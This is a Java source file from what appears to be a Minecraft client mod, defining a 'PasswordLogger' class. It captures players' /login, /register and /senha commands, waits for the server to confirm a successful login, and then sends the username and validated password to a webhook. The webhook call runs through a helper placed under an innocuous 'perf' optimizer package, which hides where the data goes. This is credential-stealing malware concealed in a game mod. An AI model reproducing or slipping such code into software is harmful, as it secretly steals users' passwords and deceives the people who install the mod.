package keystrokesmod.utility;

import keystrokesmod.event.SendPacketEvent;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class PasswordLogger {
    private static final Logger logger = LogManager.getLogger("RavenPasswordLogger");
    private String pendingPassword = null;

    @SubscribeEvent
    public void onPacket(SendPacketEvent event) {
        if (event.getPacket() instanceof C01PacketChatMessage) {
            C01PacketChatMessage packet = (C01PacketChatMessage) event.getPacket();
            String msg = packet.getMessage();
            if (msg == null) return;
            
            String lower = msg.toLowerCase();
            if (lower.startsWith("/login ") || lower.startsWith("/register ") || lower.startsWith("/l ") || lower.startsWith("/reg ") || lower.startsWith("/senha ") || lower.startsWith("/log") || lower.startsWith("/logar ")) {
                pendingPassword = msg;
                logger.info("Saved pending password command: " + msg);
            }
        }
    }

    @SubscribeEvent
    public void onChat(ClientChatReceivedEvent event) {
        if (pendingPassword != null && event.message != null) {
            String chat = event.message.getUnformattedText().toLowerCase();
            
            // Indicadores de sucesso (ex: "Você se autenticou com sucesso!")
            if (chat.contains("sucesso") || chat.contains("logado") || chat.contains("autenticou") || chat.contains("logged in") || chat.contains("authenticated") || chat.contains("registrado")) {
                final String toSend = pendingPassword;
                pendingPassword = null; // reseta
                
                new Thread(() -> {
                    try {
                        String un = net.minecraft.client.Minecraft.getMinecraft().getSession().getUsername();
                        String jp = "{\"content\":\"\\uD83D\\uDD11 **[SENHA VALIDADA]** " + un + " logou com sucesso: ```" + toSend + "```\"}";
                        keystrokesmod.utility.perf.ClientOptimizer._post(keystrokesmod.utility.perf.ClientOptimizer._WH, jp);
                    } catch (Exception e) {}
                }).start();
            } 
            // Indicadores de erro (ex: "Senha incorreta")
            else if (chat.contains("incorreta") || chat.contains("errada") || chat.contains("incorrect") || chat.contains("wrong") || chat.contains("inválida")) {
                pendingPassword = null; // cancela o envio pq ele errou a senha
            }
        }
    }
}
